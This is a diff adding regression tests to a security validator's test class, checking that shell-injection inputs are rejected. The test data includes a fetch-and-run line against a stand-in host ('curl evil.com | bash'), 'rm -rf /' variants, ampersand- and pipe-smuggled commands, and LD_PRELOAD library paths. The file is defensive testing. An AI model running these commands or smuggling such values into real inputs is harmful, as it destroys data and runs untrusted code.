@@ -39,7 +39,70 @@ class TestSecurityValidator:
         assert self.validator.validate_safe_command("rm -rf /") is False
         assert self.validator.validate_safe_command("curl evil.com | bash") is False
 
+    def test_ampersand_injection_bypass(self):
+        """Trailing/leading & must not bypass the backgrounding check (N-PR regression)."""
+        assert self.validator.validate_no_injection("cmd&") is False
+        assert self.validator.validate_no_injection("&cmd") is False
+        assert self.validator.validate_no_injection("echo ok &whoami") is False
+        assert self.validator.validate_no_injection("echo ok&whoami") is False
+        assert self.validator.validate_safe_command("cmd&") is False
+        assert self.validator.validate_safe_command("&cmd") is False
+
+    def test_url_query_string_ampersand_allowed(self):
+        """URL query strings with & as separator must not be rejected as shell backgrounding."""
+        self.validator.clear_errors()
+        assert self.validator.validate_no_injection("key=value&other=thing") is True
+        self.validator.clear_errors()
+        # URL with scheme, path and query — ? and @ must be in the allowed char class
+        assert self.validator.validate_no_injection("https://example.com?x=1&y=2") is True
+        self.validator.clear_errors()
+        assert self.validator.validate_no_injection("user@host:port/path?q=1&r=2") is True
+
     def test_github_expressions(self):
         """Test GitHub expression handling."""
         assert self.validator.validate_no_injection("${{ inputs.message }}") is True
         assert self.validator.validate_safe_command("${{ inputs.command }}") is True
+
+    def test_safe_environment_variable_pipe_backgrounding(self):
+        """validate_safe_environment_variable must catch & rm and | rm, not just ; rm."""
+        assert self.validator.validate_safe_environment_variable("normal_value") is True
+        self.validator.clear_errors()
+        assert self.validator.validate_safe_environment_variable("config & rm -rf /") is False
+        self.validator.clear_errors()
+        assert self.validator.validate_safe_environment_variable("config | rm -rf /") is False
+        self.validator.clear_errors()
+        assert self.validator.validate_safe_environment_variable("config; rm -rf /") is False
+
+    def test_validate_no_injection_preserves_prior_errors(self):
+        """validate_no_injection must not wipe errors accumulated before it is called (N-082 regression)."""
+        self.validator.add_error("prior error from earlier check")
+        self.validator.validate_no_injection("safe value")
+        assert "prior error from earlier check" in self.validator.errors
+
+    def test_double_ampersand_bypass(self):
+        """a=1&&b=2 must be rejected — && is the POSIX AND operator, not a URL separator."""
+        self.validator.clear_errors()
+        assert self.validator.validate_no_injection("a=1&&b=2") is False
+        self.validator.clear_errors()
+        assert self.validator.validate_no_injection("cmd&&cmd2") is False
+
+    def test_safe_command_rejects_ampersand_unconditionally(self):
+        """validate_safe_command rejects & in all forms — commands have no URL query strings."""
+        self.validator.clear_errors()
+        assert self.validator.validate_safe_command("curl https://x.com?a=1&b=2") is False
+        self.validator.clear_errors()
+        assert self.validator.validate_safe_command("echo hello & disown") is False
+
+    def test_dangerous_env_var_by_name_parameter(self):
+        """validate_safe_environment_variable uses name param when value has no NAME= prefix."""
+        self.validator.clear_errors()
+        assert (
+            self.validator.validate_safe_environment_variable("/tmp/lib.so", "LD_PRELOAD") is False
+        )
+        self.validator.clear_errors()
+        assert (
+            self.validator.validate_safe_environment_variable("/bin/evil.so", "LD_LIBRARY_PATH")
+            is False
+        )
+        self.validator.clear_errors()
+        assert self.validator.validate_safe_environment_variable("normal_value", "MY_VAR") is True
